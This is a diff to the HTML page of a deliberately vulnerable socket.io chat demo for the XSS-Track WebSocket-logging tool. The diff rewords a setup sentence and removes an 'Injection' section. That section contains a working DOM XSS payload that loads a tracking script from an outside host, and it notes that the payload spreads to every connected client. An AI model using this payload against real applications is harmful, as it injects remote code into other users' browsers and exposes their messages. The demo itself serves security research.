@@ -9,7 +9,7 @@
     This is an example of <a href="http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html">XSS-Track</a> ability to dump <a href="http://en.wikipedia.org/wiki/WebSockets">WebSockets</a> communication.
     </p>
     <p>This is a modified vulnerable version of <a href="https://github.com/LearnBoost/Socket.IO-node">socket.io</a> chat application</p>
-    <p>I've set up a test WebSocket server to go with it <a rel="nofollow" href="http://krzysztof.kotowicz.net:9999">here</a> but it won't last long., so you could test it yourself:</p>
+    <p>I've set up a test WebSocket server to go with it <a rel="nofollow" href="http://krzysztof.kotowicz.net:9999">here</a> but it won't last long, so to test it yourself follow these steps:</p>
     <h2>Set up</h2>
     <ol>
       <li>install <a href="http://nodejs.org/#build">node.js</a> framework</li>
@@ -19,24 +19,5 @@
       $ node server.js</pre></li>
       <li>run the client in WebSockets compatible browser (Chrome is a safe bet): <a href="http://localhost:9999">http://localhost:9999</a></li>
     </ol>
-
-    <h2>Injection</h2>
-    <p>The chat message is vulnerable to DOM XSS, use e.g. the following payload to test it:</p>
-    <pre>
-    &lt;img src=a onerror="s=document.createElement('script');s.src='http://kotowicz.net/xss-track/track.js?debug=1&amp;websocket=1';document.body.appendChild(s);"&gt;
-    </pre>
-    <p>(The payload will also distribute to all clilents connected to the chat)</p>
-    <p>After the injection all WebSockets communication will be logged to console (Ctrl-Shift-I to see the console in Chrome)</p>
-    <style>
-      #chat { height: 300px; overflow: auto; width: 800px; border: 1px solid #eee; font: 13px Helvetica, Arial; }
-      #chat p { padding: 8px; margin: 0; }
-      #chat p:nth-child(odd) { background: #F6F6F6; }
-      #form { width: 782px; background: #333; padding: 5px 10px; display: none; }
-      #form input[type=text] { width: 700px; padding: 5px; background: #fff; border: 1px solid #fff; }
-      #form input[type=submit] { cursor: pointer; background: #999; border: none; padding: 6px 8px; -moz-border-radius: 8px; -webkit-border-radius: 8px; margin-left: 5px; text-shadow: 0 1px 0 #fff; }
-      #form input[type=submit]:hover { background: #A2A2A2; }
-      #form input[type=submit]:active { position: relative; top: 2px; }
-    </style>
-    
   </body>
 </html>
